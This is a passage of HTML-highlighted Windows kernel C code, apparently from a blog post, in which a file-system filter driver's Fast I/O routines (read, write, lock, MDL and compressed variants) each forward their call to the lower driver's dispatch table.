class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOLEAN <span class="title">FastIoRead</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoRead == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoRead</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        Wait,</span><br><span class="line">        LockKey,</span><br><span class="line">        Buffer,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoWrite</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoWrite == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoWrite</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        Wait,</span><br><span class="line">        LockKey,</span><br><span class="line">        Buffer,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoQueryBasicInfo</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_BASIC_INFORMATION Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoQueryBasicInfo == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoQueryBasicInfo</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        Wait,</span><br><span class="line">        Buffer,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoQueryStandardInfo</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_STANDARD_INFORMATION Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoQueryStandardInfo == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoQueryStandardInfo</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        Wait,</span><br><span class="line">        Buffer,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoLock</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    PEPROCESS ProcessId,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Key,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN FailImmediately,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN ExclusiveLock,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoLock == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoLock</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        ProcessId,</span><br><span class="line">        Key,</span><br><span class="line">        FailImmediately,</span><br><span class="line">        ExclusiveLock,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoUnlockSingle</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    PEPROCESS ProcessId,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Key,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoUnlockSingle == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoUnlockSingle</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        ProcessId,</span><br><span class="line">        Key,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoUnlockAll</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PEPROCESS ProcessId,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoUnlockAll == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoUnlockAll</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        ProcessId,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoUnlockAllByKey</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID ProcessId,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Key,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoUnlockAllByKey == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoUnlockAllByKey</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        ProcessId,</span><br><span class="line">        Key,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoDeviceControl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID InputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG InputBufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID OutputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG OutputBufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG IoControlCode,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoDeviceControl == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoDeviceControl</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        Wait,</span><br><span class="line">        InputBuffer,</span><br><span class="line">        InputBufferLength,</span><br><span class="line">        OutputBuffer,</span><br><span class="line">        OutputBufferLength,</span><br><span class="line">        IoControlCode,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoQueryNetworkOpenInfo</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_NETWORK_OPEN_INFORMATION Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoQueryNetworkOpenInfo == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoQueryNetworkOpenInfo</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        Wait,</span><br><span class="line">        Buffer,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoMdlRead</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL* MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;MdlRead == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">MdlRead</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        LockKey,</span><br><span class="line">        MdlChain,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoMdlReadComplete</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;MdlReadComplete == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">MdlReadComplete</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        MdlChain,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoPrepareMdlWrite</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL* MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;PrepareMdlWrite == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">PrepareMdlWrite</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        LockKey,</span><br><span class="line">        MdlChain,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoMdlWriteComplete</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;MdlWriteComplete == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">MdlWriteComplete</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        MdlChain,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoReadCompressed</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL* MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _COMPRESSED_DATA_INFO* CompressedDataInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG CompressedDataInfoLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoReadCompressed == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoReadCompressed</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        LockKey,</span><br><span class="line">        Buffer,</span><br><span class="line">        MdlChain,</span><br><span class="line">        IoStatus,</span><br><span class="line">        CompressedDataInfo,</span><br><span class="line">        CompressedDataInfoLength,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoWriteCompressed</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL* MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _COMPRESSED_DATA_INFO* CompressedDataInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG CompressedDataInfoLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoWriteCompressed == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoWriteCompressed</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        LockKey,</span><br><span class="line">        Buffer,</span><br><span class="line">        MdlChain,</span><br><span class="line">        IoStatus,</span><br><span class="line">        CompressedDataInfo,</span><br><span class="line">        CompressedDataInfoLength,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoMdlReadCompleteCompressed</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;MdlReadCompleteCompressed == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">MdlReadCompleteCompressed</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        MdlChain,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoMdlWriteCompleteCompressed</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;MdlWriteCompleteCompressed == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">MdlWriteCompleteCompressed</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        MdlChain,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span 